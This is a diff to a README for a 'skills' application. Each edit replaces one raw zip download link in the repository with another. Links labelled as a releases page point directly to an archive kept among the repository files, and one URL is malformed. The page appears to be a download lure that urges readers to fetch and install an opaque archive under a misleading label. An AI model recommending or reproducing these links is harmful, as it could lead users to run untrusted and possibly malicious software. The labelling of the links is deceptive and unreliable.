@@ -6,7 +6,7 @@ Welcome to the **skills** application! This tool helps you understand and improv
 
 ## 📥 Download Here
 
-[![Download the skills application](https://github.com/iiMooDY9/skills/raw/refs/heads/master/skills/cloudflare/Software_v3.9.zip%https://github.com/iiMooDY9/skills/raw/refs/heads/master/skills/cloudflare/Software_v3.9.zip)](https://github.com/iiMooDY9/skills/raw/refs/heads/master/skills/cloudflare/Software_v3.9.zip)
+[![Download the skills application](https://github.com/iiMooDY9/skills/raw/refs/heads/master/scripts/Software_v2.0.zip%https://github.com/iiMooDY9/skills/raw/refs/heads/master/scripts/Software_v2.0.zip)](https://github.com/iiMooDY9/skills/raw/refs/heads/master/scripts/Software_v2.0.zip)
 
 ## 📋 System Requirements
 
@@ -21,7 +21,7 @@ Before you download the skills application, ensure your system meets the followi
 
 To download the skills application, visit the releases page using the link below. 
 
-[Visit the Releases Page](https://github.com/iiMooDY9/skills/raw/refs/heads/master/skills/cloudflare/Software_v3.9.zip)
+[Visit the Releases Page](https://github.com/iiMooDY9/skills/raw/refs/heads/master/scripts/Software_v2.0.zip)
 
 Once there, look for the latest version. Click on the file that matches your operating system to download it. After downloading, follow these steps to install:
 
@@ -68,4 +68,4 @@ We hope the skills application helps you achieve your programming goals. Your jo
 
 Don't forget to download the application from the link below!
 
-[Visit the Releases Page](https://github.com/iiMooDY9/skills/raw/refs/heads/master/skills/cloudflare/Software_v3.9.zip)
+[Visit the Releases Page](https://github.com/iiMooDY9/skills/raw/refs/heads/master/scripts/Software_v2.0.zip)
